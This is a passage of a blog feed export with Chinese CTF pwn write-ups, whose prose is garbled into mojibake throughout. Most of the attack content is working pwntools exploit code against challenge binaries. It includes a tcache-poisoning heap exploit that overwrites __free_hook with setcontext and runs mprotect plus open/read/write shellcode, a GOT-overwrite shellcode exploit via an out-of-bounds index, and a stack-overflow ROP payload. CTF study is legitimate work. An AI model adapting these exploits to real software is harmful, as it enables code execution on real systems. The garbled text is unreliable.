<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#ä¿®æ”¹tcache bin</span><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x50</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x50</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x20</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x60</span>)<br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">1</span>)<br>show(<span class="hljs-number">1</span>)<br>leak_heap=u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>))<br>log.success(<span class="hljs-string">&#x27;leak heap: &#x27;</span>+<span class="hljs-built_in">hex</span>(leak_heap))<br>next_heap=leak_heap + <span class="hljs-number">0xc0</span><br>tc_addr=leak_heap - <span class="hljs-number">0xf60</span><br>log.success(<span class="hljs-string">&#x27;tc addr: &#x27;</span>+<span class="hljs-built_in">hex</span>(tc_addr))<br>free(<span class="hljs-number">3</span>)<br>edit(<span class="hljs-number">3</span>, p64(tc_addr))<br>add(<span class="hljs-number">4</span>, <span class="hljs-number">0x60</span>)<br>add(<span class="hljs-number">5</span>, <span class="hljs-number">0x60</span>)<br>payload = p64(<span class="hljs-number">0x200000002</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x0707070707070707</span>)*<span class="hljs-number">6</span><br></code></pre></td></tr></table></figure>

<p><img src="/2021/09/21/2021-09-21-2021%E9%95%BF%E5%9F%8E%E6%9D%AFPWN/image-20210922162838313.png" alt="image-20210922162838313"></p>
<p>ä¿®æ”¹ä¹‹å‰é‡Šæ”¾å †å—çš„fdæŒ‡é’ˆæŒ‡å‘0x20å †å—ï¼Œè€Œå‰é¢ä¹Ÿä¿®æ”¹äº†0x60å †å—çš„countæ•°é‡ä¸º2ï¼Œæ‰€ä»¥å¯ä»¥ç”³è¯·ï¼Œé€ æˆoverlapï¼Œä¹‹åä¿®æ”¹0x20å †å—çš„sizeï¼Œç”³è¯·0x30çš„å †å—ï¼Œï¼ˆåŸå› æ˜¯è¿™ä¸ªå¤§å°çš„å †å—æ˜¯ä¸å­˜åœ¨ç©ºé—²çš„å †å—ï¼Œæ‰€ä»¥å¯ä»¥å…¨éƒ¨ç›¸é‚»åœ¨ä¸€èµ·ï¼Œæ–¹ä¾¿æ“ä½œï¼‰ã€‚æŠŠåº•ä¸‹çš„å †å—éƒ½åŒ…å«åœ¨å†…ï¼Œè®°å¾—è¦ç•™ä¸€ä¸ªé˜²æ­¢ä¸top chunkè¿›è¡Œåˆå¹¶</p>
<p><img src="/2021/09/21/2021-09-21-2021%E9%95%BF%E5%9F%8E%E6%9D%AFPWN/image-20210922163245528.png" alt="image-20210922163245528"></p>
<p><img src="/2021/09/21/2021-09-21-2021%E9%95%BF%E5%9F%8E%E6%9D%AFPWN/image-20210922163344836.png" alt="image-20210922163344836"></p>
<p>ç„¶åé‡Šæ”¾å¾—åˆ°libcåœ°å€</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#æ³„éœ²libcåŸºå€</span><br>edit(<span class="hljs-number">5</span>, payload)<br>edit(<span class="hljs-number">1</span>, p64(next_heap))<br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0x30</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x30</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x30</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x30</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x30</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x30</span>)<br>add(<span class="hljs-number">6</span>,<span class="hljs-number">0x50</span>)<br>add(<span class="hljs-number">7</span>,<span class="hljs-number">0x50</span>)<br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">5</span> + p64(<span class="hljs-number">0x141</span>)<br>edit(<span class="hljs-number">7</span>, payload)<br>free(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x3ebca0</span><br>log.success(<span class="hljs-string">&#x27;libc base: &#x27;</span>+ <span class="hljs-built_in">hex</span>(libc_base))<br></code></pre></td></tr></table></figure>

<p><img src="/2021/09/21/2021-09-21-2021%E9%95%BF%E5%9F%8E%E6%9D%AFPWN/image-20210922165259157.png" alt="image-20210922165259157"></p>
<p>å¾€free_hooké‡Œé¢å†™å…¥setcontext+53çš„åœ°å€</p>
<p>ç„¶åæ ¹æ®<code>setcontext+53</code>ä¸Šçš„å¯„å­˜å™¨å¸ƒç½®ç¯å¢ƒï¼šè€Œrdiçš„å€¼æ˜¯æˆ‘ä»¬ç­‰ä¸‹è¦é‡Šæ”¾çš„å †å—çš„åœ°å€ï¼Œæ ¹æ®è¿™ä¸ªè®¡ç®—å‡ºåç§»ï¼Œåœ¨å¯¹åº”çš„åœ°å€ä¸ºrdiï¼Œrsiï¼Œrdxè®¾ç½®å‚æ•°ï¼Œç„¶åè®¾ç½®rcxçš„å€¼ä¸ºmprotectçš„åœ°å€ï¼Œå»æ‰§è¡Œmprotectï¼Œå†è·³è½¬å›æ¥æ‰§è¡Œshellcodeè¯»å–flag</p>
<p><img src="/2021/09/21/2021-09-21-2021%E9%95%BF%E5%9F%8E%E6%9D%AFPWN/image-20210922170913920.png" alt="image-20210922170913920"></p>
<p>æˆåŠŸè¯»å–flagï¼</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">8</span>, <span class="hljs-number">0x50</span>)<br>add(<span class="hljs-number">9</span>, <span class="hljs-number">0x50</span>)<br>add(<span class="hljs-number">10</span>, <span class="hljs-number">0x50</span>) <br>add(<span class="hljs-number">11</span>, <span class="hljs-number">0x10</span>)<br>free(<span class="hljs-number">11</span>)<br>edit(<span class="hljs-number">11</span>, p64(free_hook))<br>add(<span class="hljs-number">11</span>, <span class="hljs-number">0x10</span>)<br>add(<span class="hljs-number">11</span>, <span class="hljs-number">0x10</span>) <span class="hljs-comment">#free_hook</span><br>edit(<span class="hljs-number">11</span>, p64(setcontext))<br>shellcode_addr = tc_addr + <span class="hljs-number">0x1110</span><br>shellcode = asm(<br>	<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    mov rsi, 0x67616c662f2e</span><br><span class="hljs-string">    push rsi</span><br><span class="hljs-string">    mov rdi, rsp</span><br><span class="hljs-string">    mov rax, 2</span><br><span class="hljs-string">    xor rsi, rsi</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">    mov rdi, rax</span><br><span class="hljs-string">    xor rax, rax</span><br><span class="hljs-string">    mov rsi, rsp</span><br><span class="hljs-string">    mov rdx, 0x50</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">    mov rax, 1</span><br><span class="hljs-string">    mov rdi, 1</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span>)<br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">5</span>*<span class="hljs-number">2</span><br>edit(<span class="hljs-number">8</span>, payload)<br>payload = p64(<span class="hljs-number">0</span>) + p64(tc_addr-<span class="hljs-number">0x10</span>) + p64(<span class="hljs-number">0x10000</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x7</span>) <br>payload += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) + p64(shellcode_addr) + p64(mprotect)<br>edit(<span class="hljs-number">9</span>, payload)<br>payload = p64(shellcode_addr + <span class="hljs-number">8</span>) + shellcode<br>edit(<span class="hljs-number">10</span>, payload)<br>free(<span class="hljs-number">8</span>)<br></code></pre></td></tr></table></figure>

<p>å®Œæ•´expï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.27-3ubuntu1.4_amd64/libc-2.27.so&quot;</span>)<br><span class="hljs-comment">#libc = ELF(&quot;./libc.so.6&quot;)</span><br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.27-3ubuntu1.4_amd64/ld-2.27.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br><span class="hljs-comment">#p = remote(&quot;47.104.175.110&quot;,61608)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">idx,size</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; \n&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;input index:\n&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	p.recvuntil(<span class="hljs-string">&quot;input size:\n&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(size))<br>	<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; \n&quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;input index:\n&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	p.recvuntil(<span class="hljs-string">&quot;input context:\n&quot;</span>)<br>	p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; \n&quot;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;input index:\n&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; \n&quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;input index:\n&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0x50</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x50</span>)<br>add(<span class="hljs-number">2</span>, <span class="hljs-number">0x20</span>)<br>add(<span class="hljs-number">3</span>, <span class="hljs-number">0x60</span>)<br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">1</span>)<br>show(<span class="hljs-number">1</span>)<br>leak_heap = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>))<br>log.success(<span class="hljs-string">&#x27;leak heap: &#x27;</span>+ <span class="hljs-built_in">hex</span>(leak_heap))<br>next_heap = leak_heap + <span class="hljs-number">0xc0</span><br>tc_addr = leak_heap - <span class="hljs-number">0xf60</span><br>log.success(<span class="hljs-string">&#x27;tc addr: &#x27;</span>+ <span class="hljs-built_in">hex</span>(tc_addr))<br>free(<span class="hljs-number">3</span>)<br>edit(<span class="hljs-number">3</span>, p64(tc_addr))<br>add(<span class="hljs-number">4</span>, <span class="hljs-number">0x60</span>)<br>add(<span class="hljs-number">5</span>, <span class="hljs-number">0x60</span>)<br>payload = p64(<span class="hljs-number">0x200000002</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x0707070707070707</span>)*<span class="hljs-number">6</span><br>edit(<span class="hljs-number">5</span>, payload)<br><br>edit(<span class="hljs-number">1</span>, p64(next_heap))<br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0x30</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x30</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x30</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x30</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x30</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x30</span>)<br>add(<span class="hljs-number">6</span>,<span class="hljs-number">0x50</span>)<br>add(<span class="hljs-number">7</span>,<span class="hljs-number">0x50</span>)<br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">5</span> + p64(<span class="hljs-number">0x141</span>)<br>edit(<span class="hljs-number">7</span>, payload)<br>free(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x3ebca0</span><br>log.success(<span class="hljs-string">&#x27;libc base: &#x27;</span>+ <span class="hljs-built_in">hex</span>(libc_base))<br>setcontext = libc_base + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>] + <span class="hljs-number">53</span><br>free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>mprotect = libc_base+libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br><br>add(<span class="hljs-number">8</span>, <span class="hljs-number">0x50</span>) <span class="hljs-comment">#control regs</span><br>add(<span class="hljs-number">9</span>, <span class="hljs-number">0x50</span>) <span class="hljs-comment">#control regs</span><br>add(<span class="hljs-number">10</span>, <span class="hljs-number">0x50</span>) <span class="hljs-comment">#shellcode</span><br>add(<span class="hljs-number">11</span>, <span class="hljs-number">0x10</span>)<br>free(<span class="hljs-number">11</span>)<br>edit(<span class="hljs-number">11</span>, p64(free_hook))<br>add(<span class="hljs-number">11</span>, <span class="hljs-number">0x10</span>)<br>add(<span class="hljs-number">11</span>, <span class="hljs-number">0x10</span>) <span class="hljs-comment">#free_hook</span><br>edit(<span class="hljs-number">11</span>, p64(setcontext))<br>shellcode_addr = tc_addr + <span class="hljs-number">0x1110</span><br>shellcode = asm(<br>	<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    mov rsi, 0x67616c662f2e</span><br><span class="hljs-string">    push rsi</span><br><span class="hljs-string">    mov rdi, rsp</span><br><span class="hljs-string">    mov rax, 2</span><br><span class="hljs-string">    xor rsi, rsi</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">    mov rdi, rax</span><br><span class="hljs-string">    xor rax, rax</span><br><span class="hljs-string">    mov rsi, rsp</span><br><span class="hljs-string">    mov rdx, 0x50</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">    mov rax, 1</span><br><span class="hljs-string">    mov rdi, 1</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span>)<br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">5</span>*<span class="hljs-number">2</span><br>edit(<span class="hljs-number">8</span>, payload)<br>payload = p64(<span class="hljs-number">0</span>) + p64(tc_addr-<span class="hljs-number">0x10</span>) + p64(<span class="hljs-number">0x10000</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x7</span>) <br>payload += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) + p64(shellcode_addr) + p64(mprotect)<br>edit(<span class="hljs-number">9</span>, payload)<br>payload = p64(shellcode_addr + <span class="hljs-number">8</span>) + shellcode<br>edit(<span class="hljs-number">10</span>, payload)<br>free(<span class="hljs-number">8</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>



<h2 id="easy-vm"><a href="#easy-vm" class="headerlink" title="easy_vm"></a>easy_vm</h2><p>ä»¥åå­¦åˆ°äº†ï¼Œå†å›æ¥å¤ç°ï¼ˆå¯èƒ½æ˜¯è¿‘æœŸ å§ï¼Œè¿‘æœŸå†³å®šçˆ†è‚å­¦ä¹ ï¼Œå¸Œæœ›èƒ½ï¼‰</p>
]]></content>
      <tags>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>ptmalloc--ç¬”è®°</title>
    <url>/2021/09/17/2021-09-17-ptmalloc-%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>è¯¥ç¯‡åšå®¢æ˜¯å­¦ä¹ ã€Šglibcå†…å­˜ç®¡ç†ptmallocæºä»£ç åˆ†æ@ååº­ã€‹æ—¶ï¼Œè¾¹å­¦è¾¹è®°å½•çš„ä¸€äº›é›¶æ•£çŸ¥è¯†ç‚¹ï¼Œä»¥åŠå¯èƒ½ä¼šæœ‰çš„ä¸€äº›ç²—æµ…çš„ä¸ªäººè§è§£ï¼Œæˆ–è€…å› æŸäº›çŸ¥è¯†äº§ç”Ÿçš„é—®é¢˜ä¸æ€è€ƒ</p>
<h2 id="ç¬”è®°"><a href="#ç¬”è®°" class="headerlink" title="ç¬”è®°"></a>ç¬”è®°</h2><p>1ã€</p>
<h2 id="ä¸ªäººé—®é¢˜ä¸ä¸ªäººè§£ç­”"><a href="#ä¸ªäººé—®é¢˜ä¸ä¸ªäººè§£ç­”" class="headerlink" title="ä¸ªäººé—®é¢˜ä¸ä¸ªäººè§£ç­”"></a>ä¸ªäººé—®é¢˜ä¸ä¸ªäººè§£ç­”</h2>]]></content>
      <tags>
        <tag>ptmalloc</tag>
      </tags>
  </entry>
  <entry>
    <title>2021å¼ºç½‘æ¯PWN</title>
    <url>/2021/09/14/2021-09-14-2021%E5%BC%BA%E7%BD%91%E6%9D%AFPWN/</url>
    <content><![CDATA[<p>å¤ç°æ¥æºï¼š</p>
<p><a href="https://blog.csdn.net/eeeeeight/article/details/118006138">https://blog.csdn.net/eeeeeight/article/details/118006138</a></p>
<p><a href="https://cloud.tencent.com/developer/article/1839670">https://cloud.tencent.com/developer/article/1839670</a></p>
<h2 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h2><p><img src="/2021/09/14/2021-09-14-2021%E5%BC%BA%E7%BD%91%E6%9D%AFPWN/image-20210914154341329.png" alt="image-20210914154341329"></p>
<p>checksecä¸€ä¸‹ï¼Œ64ä½ï¼Œå †æ ˆå¯æ‰§è¡Œ</p>
<p>è¿›å…¥IDAï¼Œåªå­˜åœ¨ç”³è¯·å’Œé‡Šæ”¾å †å—çš„åŠŸèƒ½ï¼Œå…¶ä¸­ï¼Œç”³è¯·æœ€å¤šä¸¤æ¬¡ï¼Œé‡Šæ”¾åªæœ‰ä¸€æ¬¡ã€‚</p>
<p><img src="/2021/09/14/2021-09-14-2021%E5%BC%BA%E7%BD%91%E6%9D%AFPWN/image-20210914155156145.png" alt="image-20210914155156145"></p>
<p><img src="/2021/09/14/2021-09-14-2021%E5%BC%BA%E7%BD%91%E6%9D%AFPWN/image-20210914155132957.png" alt="image-20210914155132957"></p>
<p>é¦–å…ˆï¼Œæ²¡æœ‰æ£€æŸ¥ç´¢å¼•ä¸‹é™ï¼Œæ‰€ä»¥å­˜åœ¨æ•°ç»„è¶Šç•Œï¼Œå¯ä»¥è¶Šç•Œåˆ°gotè¡¨ã€‚ç„¶åè¾“å…¥å‡½æ•°ä¸­ï¼Œå¦‚æœæˆ‘ä»¬åœ¨è¾“å…¥sizeæ—¶ï¼Œç›´æ¥è¾“å…¥â€™\nâ€™ï¼Œå°†ä¼šè®©sizeç›´æ¥ä¸º0ï¼Œè€Œå¦‚æœsizeä¸º0äº†ï¼Œåœ¨å¾€å †é‡Œé¢è¾“å…¥æ•°æ®æ˜¯å°±å¯ä»¥æ— é™è¾“å…¥ï¼Œå› ä¸ºåœ¨æ£€éªŒé‚£é‡Œï¼Œbufä¸€æ—¦è·å¾—è·Ÿpträ¸€æ ·çš„åœ°å€ï¼Œè€Œbufåˆè¦å…ˆè‡ªåŠ ï¼Œæ‰å°±ä¼šå¯¼è‡´ä¸€ç›´éƒ½å°†å¤§äºptrï¼ŒéªŒè¯ä¸€ç›´éƒ½æ˜¯æ²¡æœ‰é—®é¢˜çš„</p>
<p><img src="/2021/09/14/2021-09-14-2021%E5%BC%BA%E7%BD%91%E6%9D%AFPWN/image-20210914155508246.png" alt="image-20210914155508246"></p>
<p>ç¨‹åºæœ‰æ²™ç®±ï¼Œæ‰€ä»¥å°±æ˜¯orwã€‚åŠ ä¸Šå‰é¢å‘ç°çš„æ¼æ´ç‚¹ï¼Œç»“åˆèµ·æ¥å°±æ˜¯ï¼Œé€šè¿‡æ•°ç»„è¶Šç•Œï¼Œå°†å †å—æŒ‡é’ˆå†™å…¥åˆ°å‡½æ•°çš„gotè¡¨é‡Œé¢ï¼Œç„¶åå› ä¸ºæ— é™è¾“å…¥ï¼Œå †å—åˆå¯æ‰§è¡Œï¼Œæ‰€ä»¥å¾€å †å—é‡Œé¢å†™å…¥shellcodeï¼Œæœ€åå°±æ˜¯è°ƒç”¨è¢«ä¿®æ”¹å‡½æ•°ï¼Œè½¬è€Œå»æ‰§è¡Œshellcodeæ¥è¯»å–flag</p>
<p>ç„¶åå‘¢ï¼Œæœ¬åœ°å¤ç°ä¸äº†ï¼Œæš‚æ—¶ä¸çŸ¥é“è¯¥æ€ä¹ˆè®©æ–‡ä»¶å»é“¾æ¥ä¸Šé¢˜ç›®ç»™çš„seccompæ–‡ä»¶ï¼Œæ‰€ä»¥åªèƒ½è®²è®²æ€è·¯</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#sh=process(&#x27;./orw&#x27;)</span><br>elf=ELF(<span class="hljs-string">&#x27;./orw&#x27;</span>)<br>libc=elf.libc<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">pwn</span>():</span><br>    shellcode=<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    xor rax, rax</span><br><span class="hljs-string">    xor rdi, rdi</span><br><span class="hljs-string">    xor rsi, rsi</span><br><span class="hljs-string">    xor rdx, rdx</span><br><span class="hljs-string">    mov rax, 2</span><br><span class="hljs-string">    mov rdi, 0x67616c662f2e</span><br><span class="hljs-string">    push rdi</span><br><span class="hljs-string">    mov rdi, rsp</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">    mov rdx, 0x100</span><br><span class="hljs-string">    mov rsi, rdi</span><br><span class="hljs-string">    mov rdi, rax</span><br><span class="hljs-string">    mov rax, 0</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">    mov rdi, 1</span><br><span class="hljs-string">    mov rax, 1</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>    sh.recv()<br>    sh.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>    sh.recvuntil(<span class="hljs-string">&#x27;index:&#x27;</span>)<br>    sh.sendline(<span class="hljs-string">&#x27;-25&#x27;</span>)<br>    sh.recvuntil(<span class="hljs-string">&#x27;size:&#x27;</span>)<br>    sh.sendline(<span class="hljs-string">&#x27;&#x27;</span>)<br>    sh.recvuntil(<span class="hljs-string">&#x27;content:&#x27;</span>)<br>    sh.sendline(asm(shellcode))<br>    sh.recv()<br>    sh.sendline(<span class="hljs-string">&#x27;4&#x27;</span>)<br>    sh.recv()<br>    sh.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>    sh.interactive()<br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        sh=process(<span class="hljs-string">&#x27;./orw&#x27;</span>)<br>        sh=remote(<span class="hljs-string">&#x27;39.105.131.68&#x27;</span>,<span class="hljs-number">12354</span>)<br>   <span class="hljs-keyword">try</span>:<br>            pwn()<br>        <span class="hljs-keyword">except</span>:<br>            sh.close()<br></code></pre></td></tr></table></figure>

<h2 id><a href="#" class="headerlink" title></a></h2>]]></content>
      <tags>
        <tag>å¼ºç½‘æ¯</tag>
      </tags>
  </entry>
  <entry>
    <title>2021ç¾ŠåŸæ¯PWN</title>
    <url>/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/</url>
    <content><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>è¿™æ¬¡æ¯”èµ›ï¼Œæˆ‘èƒ½åšçš„åº”è¯¥æ˜¯æœ‰ä¸‰é¢˜çš„ï¼Œå¯èƒ½è¿˜æ˜¯å¤ªèœäº†ï¼Œæ¯”èµ›æ—¶å°±æ˜¯æ²¡å‡ºï¼Œæœ€ç»ˆåªåšäº†ä¸ªç­¾åˆ°é¢˜ï¼Œè¿˜å¥½æ‰‹å¿«æŠ¢äº†ä¸€è¡€ï¼Œé•¿è·¯æ¼«æ¼«ï¼Œç»§ç»­åŠ æ²¹å§ï¼</p>
<p>å¤ç°æ¥æºï¼š<a href="https://blog.csdn.net/eeeeeight/article/details/120255533">https://blog.csdn.net/eeeeeight/article/details/120255533</a></p>
<h2 id="BabyRop"><a href="#BabyRop" class="headerlink" title="BabyRop"></a>BabyRop</h2><p>è¿™é¢˜ç­¾åˆ°é¢˜ï¼Œå¾ˆç®€å•çš„æ ˆæº¢å‡ºï¼Œæ²¡ä»€ä¹ˆå¥½è®²çš„</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span>*<br><br>p=remote(<span class="hljs-string">&#x27;192.168.39.50&#x27;</span>,<span class="hljs-number">11000</span>)<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;i386&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><span class="hljs-comment">#p.recvuntil(&quot;Input:\n&quot;)</span><br>payload = <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x2c</span> + p32(<span class="hljs-number">0x80490a0</span>) + p32(<span class="hljs-number">0</span>) + p32(<span class="hljs-number">0x0804c029</span>)<br>p.sendline(payload)<br>p.interactive()<br><br></code></pre></td></tr></table></figure>



<h2 id="nologin"><a href="#nologin" class="headerlink" title="nologin"></a>nologin</h2><p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210913165518141.png" alt="image-20210913165518141"></p>
<p>å¸¸è§„checksecï¼Œ64ä½ï¼Œä¿æŠ¤åŸºæœ¬æ²¡å¼€ï¼Œå­˜åœ¨å¯æ‰§è¡Œæ®µï¼Œè¿™ç§ä¸€èˆ¬å°±æ˜¯æ³¨å…¥shellcodeå»æ‰§è¡Œçš„</p>
<p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210913170209042.png" alt="image-20210913170209042"></p>
<p>åŒæ—¶ï¼Œå½“ä½ æ‰§è¡Œåˆ°adminåŠŸèƒ½æ—¶ï¼Œä¼šå¼€å¯æ²™ç®±ï¼Œç¦ç”¨äº†execveï¼Œæ‰€ä»¥è¿™é¢˜å°±å˜æˆäº†orwäº†ã€‚adminåŠŸèƒ½æ˜¯å¿…é¡»è¦è¿›çš„ï¼Œå› ä¸ºè¿™é‡Œæ‰å­˜åœ¨ç€æ¼æ´â€”â€”æ ˆæº¢å‡º</p>
<p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210913170334228.png" alt="image-20210913170334228"></p>
<p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210913170528035.png" alt="image-20210913170528035"></p>
<p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210913170611997.png" alt="image-20210913170611997"></p>
